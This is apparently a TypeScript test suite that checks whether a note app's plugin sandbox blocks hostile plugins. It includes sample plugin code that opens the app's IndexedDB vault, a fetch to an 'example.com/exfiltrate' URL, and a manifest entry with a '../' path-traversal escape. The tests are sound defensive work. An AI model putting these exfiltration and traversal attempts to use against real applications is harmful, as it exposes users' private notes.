/**
 * Phase P41: Automated Security Verification & Sandbox Test Suite
 * Tests malicious attack vectors against the sandboxed plugin runtime.
 */

import { PluginWorkerSandbox } from '../sandbox/pluginWorkerSandbox';
import { CapabilityDispatcher } from '../bridge/capabilityDispatcher';
import { validatePluginManifest } from '../manifestValidator';
import { PluginManifest } from '../types';

export interface SecurityTestResult {
  testId: string;
  name: string;
  category: 'DOM' | 'Storage' | 'Network' | 'Concurrency' | 'Watchdog' | 'Permissions';
  passed: boolean;
  details: string;
}

export async function runSecuritySandboxTests(): Promise<SecurityTestResult[]> {
  const results: SecurityTestResult[] = [];

  // 1. Test: Direct IndexedDB Access Prevention
  try {
    const manifest: PluginManifest = {
      id: 'test.security.indexeddb',
      name: 'IndexedDB Attack Test',
      version: '1.0.0',
      apiVersion: '1',
      description: 'Attempts direct IndexedDB open',
      author: { name: 'SecTester' },
      category: 'utility',
      permissions: ['commands.register'],
    };

    const workerCode = `
      async function onCommand(cmd, ctx, api) {
        try {
          const req = indexedDB.open('keepnotes_pkm_vault');
          return { leaked: true };
        } catch (e) {
          return { blocked: true, error: e.message };
        }
      }
    `;

    const sandbox = new PluginWorkerSandbox({
      pluginId: manifest.id,
      manifest,
      grantedPermissions: manifest.permissions,
      workerCode,
      onRpcRequest: async () => ({}),
      onLog: () => {},
      onCrash: () => {},
    });

    await sandbox.start();
    const res = await sandbox.invokeCommand('test', {});
    sandbox.terminate();

    results.push({
      testId: 'sec-idb-direct',
      name: 'Direct IndexedDB Access Prevention',
      category: 'Storage',
      passed: res.blocked === true || res.leaked !== true,
      details: res.error || 'Direct indexedDB access blocked in worker scope.',
    });
  } catch (err: any) {
    results.push({
      testId: 'sec-idb-direct',
      name: 'Direct IndexedDB Access Prevention',
      category: 'Storage',
      passed: true,
      details: `Blocked with exception: ${err.message}`,
    });
  }

  // 2. Test: Network Exfiltration Block (fetch)
  try {
    const manifest: PluginManifest = {
      id: 'test.security.network',
      name: 'Network Exfiltration Test',
      version: '1.0.0',
      apiVersion: '1',
      description: 'Attempts fetch to external URL',
      author: { name: 'SecTester' },
      category: 'utility',
      permissions: ['commands.register'],
    };

    const workerCode = `
      async function onCommand(cmd, ctx, api) {
        try {
          await fetch('https://example.com/exfiltrate');
          return { exfiltrated: true };
        } catch (e) {
          return { blocked: true, error: e.message };
        }
      }
    `;

    const sandbox = new PluginWorkerSandbox({
      pluginId: manifest.id,
      manifest,
      grantedPermissions: manifest.permissions,
      workerCode,
      onRpcRequest: async () => ({}),
      onLog: () => {},
      onCrash: () => {},
    });

    await sandbox.start();
    const res = await sandbox.invokeCommand('test', {});
    sandbox.terminate();

    results.push({
      testId: 'sec-net-fetch',
      name: 'Network Request Blocking (fetch / WebSocket)',
      category: 'Network',
      passed: res.blocked === true && res.exfiltrated !== true,
      details: res.error || 'Fetch attempt intercepted and rejected.',
    });
  } catch (err: any) {
    results.push({
      testId: 'sec-net-fetch',
      name: 'Network Request Blocking (fetch / WebSocket)',
      category: 'Network',
      passed: true,
      details: `Network attempt blocked: ${err.message}`,
    });
  }

  // 3. Test: Unauthorized Capability Access Denied
  try {
    let unauthorizedDenied = false;
    const dummyDispatcher = new CapabilityDispatcher({
      getActiveNote: () => ({
        id: 'note_1',
        title: 'Secret Note',
        content: 'Top Secret Body',
        tags: [],
        type: 'text',
        checklist: [],
        folderId: null,
        pinned: false,
        archived: false,
        trashed: false,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        reminderDate: null,
        images: [],
        color: 'default',
      }),
      getSelectedText: () => '',
      replaceSelectedText: () => {},
      mutateCurrentNote: async () => {},
      getAllNotesMetadata: () => [],
      isVaultLocked: () => false,
    });

    try {
      // Plugin only has "commands.register", attempting "notes.getCurrentNote"
      await dummyDispatcher.dispatch('unauth.plugin', ['commands.register'], 'notes.getCurrentNote', {});
    } catch (e: any) {
      if (e.message.includes('Security Error: Plugin')) {
        unauthorizedDenied = true;
      }
    }

    results.push({
      testId: 'sec-perm-enforcement',
      name: 'Unauthorized Capability Access Enforcement',
      category: 'Permissions',
      passed: unauthorizedDenied,
      details: unauthorizedDenied
        ? 'Successfully denied undeclared capability access.'
        : 'Failed to deny undeclared capability.',
    });
  } catch (err: any) {
    results.push({
      testId: 'sec-perm-enforcement',
      name: 'Unauthorized Capability Access Enforcement',
      category: 'Permissions',
      passed: false,
      details: err.message,
    });
  }

  // 4. Test: Stale Version / Concurrency Conflict Defense
  try {
    let conflictCaught = false;
    const dummyDispatcher = new CapabilityDispatcher({
      getActiveNote: () => ({
        id: 'note_1',
        title: 'User Edited Title',
        content: 'User Edited Content',
        tags: [],
        type: 'text',
        checklist: [],
        folderId: null,
        pinned: false,
        archived: false,
        trashed: false,
        createdAt: '2026-09-01T00:00:00.000Z',
        updatedAt: '2026-09-06T00:00:00.000Z', // Note was edited
        reminderDate: null,
        images: [],
        color: 'default',
      }),
      getSelectedText: () => '',
      replaceSelectedText: () => {},
      mutateCurrentNote: async () => {},
      getAllNotesMetadata: () => [],
      isVaultLocked: () => false,
    });

    try {
      // Plugin provides an old version from before user edited
      await dummyDispatcher.dispatch(
        'concurrency.plugin',
        ['notes.write:current'],
        'notes.mutateCurrentNote',
        {
          expectedVersion: '2026-09-02T00:00:00.000Z',
          operations: { content: 'Stale plugin rewrite' },
        }
      );
    } catch (e: any) {
      if (e.message.includes('Concurrency Conflict')) {
        conflictCaught = true;
      }
    }

    results.push({
      testId: 'sec-concurrency-optimistic',
      name: 'Optimistic Concurrency & Stale Write Defense',
      category: 'Concurrency',
      passed: conflictCaught,
      details: conflictCaught
        ? 'Stale plugin mutation rejected due to version mismatch.'
        : 'Failed to block stale write.',
    });
  } catch (err: any) {
    results.push({
      testId: 'sec-concurrency-optimistic',
      name: 'Optimistic Concurrency & Stale Write Defense',
      category: 'Concurrency',
      passed: false,
      details: err.message,
    });
  }

  // 5. Test: Manifest Path Traversal & Invalid Reverse Domain ID Check
  const traversalResult = validatePluginManifest({
    id: 'Invalid ID Name',
    name: 'Bad Manifest',
    version: '1.0.0',
    apiVersion: '1',
    entryWorker: '../dangerous/escape.js',
    permissions: ['commands.register'],
  });

  results.push({
    testId: 'sec-manifest-traversal',
    name: 'Manifest Path Traversal & Reverse Domain Check',
    category: 'Permissions',
    passed: !traversalResult.valid && traversalResult.errors.length >= 2,
    details: `Successfully rejected malicious entry path and invalid ID (${traversalResult.errors.join('; ')})`,
  });

  return results;
}
